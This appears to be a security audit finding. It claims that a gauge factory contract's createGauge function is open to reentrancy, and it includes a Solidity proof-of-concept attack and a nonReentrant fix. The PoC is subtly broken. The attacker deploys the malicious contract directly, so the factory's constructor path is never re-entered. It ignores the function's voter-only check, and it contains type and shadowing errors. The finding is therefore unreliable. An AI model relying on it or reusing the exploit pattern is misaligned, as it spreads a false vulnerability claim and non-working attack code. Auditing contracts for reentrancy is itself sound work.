-Function: createGauge

### Impact
The createGauge function lacks a reentrancy guard, making it susceptible to reentrancy attacks.

vulnerability to repeatedly call createGauge before the state is updated, potentially deploying multiple GaugeV3 contracts for the same pool.

Specifically, the state update getGauge[pool] = gauge; occurs after the deployment of the new GaugeV3 contract.

If the GaugeV3 constructor or any external call within it can re-enter the createGauge function, it may bypass the require(getGauge[pool] == address(0), "GE") check, allowing multiple gauges to be created for the same pool. 

### POC
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./ClGaugeFactory.sol";

contract MaliciousGaugeV3 {
    ClGaugeFactory public factory;
    address public pool;

    constructor(ClGaugeFactory factory, address _pool) {
        factory = ClGaugeFactory(factory);
        pool = _pool;
        // Attempt to re-enter the createGauge function during construction
        factory.createGauge(pool);
    }
}

contract Attack {
    ClGaugeFactory public factory;
    address public pool = 0x111; // Replace with actual pool address

    constructor(ClGaugeFactory factory) {
        factory = ClGaugeFactory(factory);
    }

    function attack() external {
        // Deploy the malicious GaugeV3 which attempts to re-enter createGauge
        new MaliciousGaugeV3(address(factory), pool);
    }
}
```

### Explanation
1. MaliciousGaugeV3 Contract: Attempts to call createGauge within its constructor, re-entering the ClGaugeFactory before getGauge[pool] is updated.
2. Attack Contract: Deploys the MaliciousGaugeV3, triggering the reentrancy and allowing multiple gauges to be created for the same pool.

## Recommended Mitigation Steps
Apply the nonReentrant Modifier to createGauge.
```Solidity
function createGauge(
    address pool
) external override nonReentrant returns (address gauge) {
    require(msg.sender == voter, "AUTH");
    require(getGauge[pool] == address(0), "GE");
    
    gauge = address(new GaugeV3(voter, nfpManager, feeCollector, pool));
    getGauge[pool] = gauge;
    
    emit GaugeCreated(pool, gauge);
}
```
